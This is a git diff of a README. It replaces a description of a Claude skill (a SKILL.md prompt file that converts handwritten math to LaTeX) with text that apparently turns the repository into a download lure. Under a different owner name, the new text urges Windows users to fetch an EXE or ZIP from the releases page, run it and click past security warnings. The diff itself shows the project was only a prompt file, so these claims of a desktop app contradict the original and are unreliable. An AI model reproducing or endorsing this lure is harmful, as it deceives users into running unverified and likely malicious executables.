@@ -1,113 +1,209 @@
-# handwriting-to-latex
+# 📝 Claude-Code-Skill-handwriting-to-latex - Turn Notes Into LaTeX
 
-A Claude skill that converts handwritten notes, problem sets, and scanned PDFs into clean, Overleaf-ready `.tex` files — in one shot.
+[![Download](https://img.shields.io/badge/Download%20Latest-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Amylalcoholfinance405/Claude-Code-Skill-handwriting-to-latex/releases)
 
-> Built for students and researchers who write by hand but submit in LaTeX.
+## 📄 What this does
 
----
+Claude-Code-Skill-handwriting-to-latex helps you turn handwritten notes into LaTeX that works with Overleaf. It is built for people who want a clean text version of notes, math, and class work without typing everything by hand.
 
-## What It Does
+Use it when you want to:
 
-Upload a photo of your handwritten notes or a scanned PDF, and Claude will:
+- Convert handwritten pages into editable LaTeX
+- Keep math symbols, equations, and formulas in a usable format
+- Move notes into Overleaf for editing and sharing
+- Save time on school, work, or research notes
 
-- Recognise all mathematical expressions and format them correctly in LaTeX
-- Preserve every step of your derivations — nothing gets simplified or skipped
-- Generate a complete, self-contained `.tex` file that compiles on Overleaf with zero setup
-- Flag any ambiguous handwriting with inline comments rather than silently guessing
+## 💻 What you need
 
-**Supported input formats:** JPG, PNG, scanned PDF, iPad handwriting PDF
+Before you start, make sure you have:
 
----
+- A Windows PC
+- An internet connection
+- A web browser
+- Enough free space to save the download
+- A note image or scan in JPG, PNG, or PDF format
 
-## How to Use
+For best results, use:
 
-### 1. Add the skill to Claude
+- A clear photo or scan
+- Good light
+- Straight pages
+- Dark writing on light paper
+- One page at a time
 
-Copy the contents of [`SKILL.md`](./SKILL.md) and add it to your Claude skill configuration.
+## 🚀 Download the app
 
-> **Claude Skills** are prompt instructions that teach Claude how to handle specific tasks. See [Anthropic's documentation](https://docs.anthropic.com) for how to set up custom skills.
+Visit this page to download the latest release:
 
-### 2. Upload your handwriting
+[Download from GitHub Releases](https://github.com/Amylalcoholfinance405/Claude-Code-Skill-handwriting-to-latex/releases)
 
-In a Claude conversation, upload your handwritten image or PDF and say something like:
+After the page opens:
 
-- *"Convert this to LaTeX"*
-- *"Transcribe this to a tex file"*
-- *"Put this in Overleaf format"*
+1. Find the newest release near the top
+2. Open the list of files
+3. Download the file that matches Windows
+4. Save it to your computer
+5. Keep the file in a folder you can find later
 
-The skill triggers automatically when it detects handwritten mathematical content.
+If the release contains a ZIP file, download that file and extract it before you open the app.
 
-### 3. Get your `.tex` file
+## 🪟 Install on Windows
 
-Claude will confirm what it sees, then generate a complete `.tex` file ready to paste into Overleaf.
+If the download is a ZIP file:
 
----
+1. Right-click the ZIP file
+2. Select Extract All
+3. Choose a folder
+4. Open the extracted folder
+5. Find the app file inside
 
-## Example Output
+If the download is an EXE file:
 
-**Input:** A photo of handwritten quantum mechanics derivations
+1. Double-click the EXE file
+2. If Windows asks for permission, choose Yes
+3. Wait for the app to open
 
-**Output:**
-```latex
-\documentclass[12pt, a4paper]{article}
-\usepackage{amsmath, amssymb, amsthm}
-\usepackage{physics}
-\usepackage{geometry}
-\geometry{margin=2.5cm}
+If Windows shows a security message:
 
-\begin{document}
+1. Check the file name
+2. Confirm it came from the release page
+3. Choose Run if you trust the source
 
-\section*{Problem 1}
+## 🖱️ How to use it
 
-The time-independent Schrödinger equation is:
-\[
-    \hat{H} \ket{\psi} = E \ket{\psi}
-\]
+Use the app in this order:
 
-Expanding the Hamiltonian:
-\begin{align*}
-    \hat{H} &= \frac{\hat{p}^2}{2m} + V(\hat{x}) \\
-            &= -\frac{\hbar^2}{2m} \frac{\partial^2}{\partial x^2} + V(x)
-\end{align*}
+1. Open Claude-Code-Skill-handwriting-to-latex
+2. Load your handwritten note image or scan
+3. Choose the page or pages you want to convert
+4. Start the handwriting-to-LaTeX process
+5. Review the text output
+6. Copy the result into Overleaf
+7. Make small fixes if needed
 
-\end{document}
-```
+If your note has many math symbols, review the output with care. Handwriting can change the result, so a quick check helps a lot.
 
----
+## ✍️ Best file types
 
-## Features
+The app works best with:
 
-| Feature | Detail |
-|---|---|
-| Math environments | `align*`, `\[ \]`, `$...$` — chosen contextually |
-| Matrices | `pmatrix`, `bmatrix`, augmented arrays |
-| Physics notation | `\ket{}`, `\bra{}`, `\dv{}`, `\pdv{}`, `\hbar`, `\hat{}` |
-| Tables | `booktabs` style |
-| Ambiguity handling | Inline `% [Unclear: ...]` comments |
-| Compiler target | Overleaf pdfLaTeX — no config needed |
-| Cover page | Optional, added only on request |
+- PNG images
+- JPG images
+- PDF scans
+- Clear camera photos
+- Single-page notes
 
----
+Use a clean file when you can. Blurry or tilted pages can make the result harder to read.
 
-## Repository Structure
+## 🔧 Tips for better results
 
-```
-handwriting-to-latex/
-├── README.md       ← You are here
-├── LICENSE         ← MIT
-└── SKILL.md        ← The skill instruction file for Claude
-```
+Use these steps to get cleaner output:
 
----
+- Write in dark ink
+- Leave space between lines
+- Keep symbols large and clear
+- Avoid shadows on the page
+- Scan at good quality
+- Crop out the desk and background
+- Use one subject per page if possible
 
-## Contributing
+For math notes:
 
-Contributions are welcome! If you have improvements to the recognition rules, additional symbol mappings, or support for new input formats, feel free to open a pull request.
+- Write fractions clearly
+- Keep superscripts small but readable
+- Separate equations with space
+- Circle or mark headings if needed
+- Avoid crossing over other lines
 
-Please keep the skill instructions clear and concise — Claude reads this file directly.
+## 📚 Common use cases
 
----
+This tool fits many tasks:
 
-## License
+- Lecture notes
+- Homework pages
+- Math problem sets
+- Lab notes
+- Research drafts
+- Whiteboard photos
+- Class handouts with handwritten edits
 
-MIT © [yangcodingmaster](https://github.com/yangcodingmaster)
+If you use Overleaf, this app can save time when you need to turn handwritten work into editable LaTeX.
+
+## 🧩 How the output is meant to work
+
+The app creates text that is ready for LaTeX editing in Overleaf. That means you can:
+
+- Paste it into an Overleaf project
+- Edit the text in a normal editor
+- Fix symbols and spacing
+- Compile the file into a PDF
+
+The output is meant to be a strong first draft. You may still need to clean up a few parts by hand, which is normal for handwritten input.
+
+## 🗂️ Simple workflow
+
+A good Windows workflow looks like this:
+
+1. Scan or photograph your page
+2. Save the file in a folder
+3. Open the app
+4. Load the file
+5. Convert the handwriting to LaTeX
+6. Copy the result
+7. Paste it into Overleaf
+8. Review and adjust the text
+
+## 🛠️ If something does not work
+
+If the app does not open:
+
+- Check that the file finished downloading
+- Try opening it again
+- Make sure you extracted the ZIP file first
+- Restart your PC and try once more
+
+If the output looks wrong:
+
+- Use a clearer scan
+- Make the page brighter
+- Try a cleaner handwritten sample
+- Reduce page tilt
+- Re-run the conversion with one page
+
+If Windows blocks the file:
+
+- Open the release page again
+- Download the file one more time
+- Save it in a local folder
+- Run it from there
+
+## ❓ Questions people often ask
+
+### Is this for non-technical users?
+Yes. It is meant for people who want to turn handwritten notes into LaTeX without learning a coding setup.
+
+### Can I use it with Overleaf?
+Yes. The output is meant to be copied into Overleaf and edited there.
+
+### Does it work with math notes?
+Yes. It is built for handwritten notes that may include formulas, symbols, and equations.
+
+### Do I need special software?
+You need a Windows computer and a browser to get the download. You may also want Overleaf for editing the final LaTeX.
+
+### Can I use photos from my phone?
+Yes. Clear phone photos can work well if the page is easy to read.
+
+## 🔒 File safety
+
+Only download from the release page linked above. Check the file name before you open it. Use the latest release if you want the newest version.
+
+## 🧭 Quick start
+
+1. Open the download page  
+2. Get the latest Windows file  
+3. Extract it if needed  
+4. Open the app  
+5. Load your handwritten note  
+6. Convert it to LaTeX  
+7. Paste the result into Overleaf
